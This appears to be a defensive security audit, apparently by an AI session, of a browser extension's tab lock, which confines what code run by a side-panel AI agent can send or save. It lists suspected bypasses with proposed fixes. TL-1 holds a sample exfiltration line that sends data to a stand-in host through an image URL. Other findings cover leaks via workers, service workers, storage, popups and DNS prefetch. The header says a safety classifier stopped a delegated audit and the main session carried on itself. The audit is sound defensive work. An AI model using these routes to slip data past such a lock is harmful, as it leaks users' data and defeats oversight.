# Audit: the tab lock (main at 4057de6)

By Claude Opus 5.5 (the main session), reading `extension/tablock.js` and its wiring in `background.js`
(the delegated audit was stopped early by a safety classifier). **Everything here is "suspected", from
the code and from how browsers behave, until a test confirms it.**

The promise (tablock.js, SECURITY.md): once a side-panel agent's code has run in a tab, nothing there can
post, send or save as the user, or carry what the page shows to another site, until the page is a new one.

| id | severity | status | one line |
|---|---|---|---|
| TL-1 | high | suspected | Cross-site images, scripts, styles, fonts and media are allowed on purpose, so `new Image().src = 'https://other.example/?d=' + data` carries data to any site |
| TL-2 | high | suspected | Requests no tab owns (tabId −1) aren't covered: a SharedWorker made from a `blob:` URL, or the site's own service worker passing a fetch through, can post and send freely |
| TL-3 | high | suspected, site-dependent | What the code leaves in the site's storage (Cache Storage behind a cache-first service worker, localStorage/IndexedDB values the site renders, cookies) is still there after the reload that unlocks, so code can come back unlocked |
| TL-4 | medium | suspected, site-dependent | Other tabs of the same site aren't locked: BroadcastChannel, storage events and SharedWorkers reach them, and the site's own code there may act on what it receives |
| TL-5 | medium | suspected | Popups: the new tab is locked only after `tabs.onCreated` (a race with its first request), and a `noopener` popup may have no `openerTabId`, so it isn't locked at all; data can ride in its URL |
| TL-6 | low/medium | suspected | DNS prefetch and preconnect (`<link rel=dns-prefetch href=//data.example>`), and WebRTC (STUN/TURN and data channels), aren't HTTP requests, so declarativeNetRequest never sees them |
| TL-7 | info | by design | Only side-panel runs (`args.scope`) lock the tab; a terminal agent's `trif run` doesn't |

## Suggested fixes
- **TL-1:** at lock time, record the domains the page has already loaded from: `performance.getEntriesByType('resource')` read in the isolated world, plus the site. Then block image, script, style, font and media requests to any **other** domain, using a rule for those resource types with `excludedRequestDomains` set to that list. The page keeps loading from its CDNs, but the code can't name a new site.
- **TL-2:** while a tab of site S is locked, also block writes and cross-site requests from no tab, made on S's behalf. That's a rule with `tabIds: [-1]` and `initiatorDomains: [S]`, plus the method and cross-site conditions.
  - Cost: the user's other tabs of S, if they post through S's service worker, can't post during the lock. The panel can say so.
- **TL-3, a decision for Tim:**
  - (a) when the tab unlocks, clear S's Cache Storage and service workers (`chrome.browsingData`, origin-scoped): cheap, and the site re-downloads;
  - (b) take a fingerprint of S's localStorage and IndexedDB at lock time and compare at unlock, staying locked and saying why if they changed;
  - (c) document the risk.
  - (a) + (c) is cheap; (b) is stronger but noisier.
- **TL-4, a decision for Tim:** lock every tab of S while one is (writes blocked by `initiatorDomains: [S]` for all of S's tabs), or accept and document it.
- **TL-5:** block navigations to other sites in tabs that didn't exist when the lock started, when the locked site starts them. That's a `main_frame` rule with `initiatorDomains: [S]` and `excludedTabIds` set to the tabs open at lock time. Typed URLs have no initiator, so the user's own new tabs work. Also listen to `webNavigation.onCreatedNavigationTarget`, which reports the source tab even for `noopener`.
- **TL-6:** mostly residual. `chrome.privacy.network.networkPredictionEnabled` off while locked would stop prefetch and preconnect, but needs the `privacy` permission. WebRTC can't be fully stopped from an extension. Document it.

## What held up (from reading)
- **Methods, not request kinds:** POST, PUT, PATCH, DELETE and CONNECT are blocked for every request kind, with no list of types to fall out of date (sendBeacon's names differ by browser).
- **Form posts and sockets:** form posts as page loads, and every WebSocket.
- **Leaving the site:** pages and frames on other sites, and fetch, XHR and event streams to them.
- **The lock comes first:** the tab is locked *before* the agent's code runs, and no lock means no code (`run`).
- **The rules are checked:** `addRules` reads back what the browser kept (one tab, the methods, the site left out of the cross-site rule) and refuses if it was changed.
- **Telling documents apart:** the marker lives in the extension's isolated world, which page code can't see or set. URL changes (`pushState`) don't unlock, and pages the extension can't script stay locked.
- **Back/forward cache:** a page back from the back/forward cache locks again and reloads.
- **Opened tabs:** tabs a locked tab opens are locked while it is (with the caveats in TL-5).
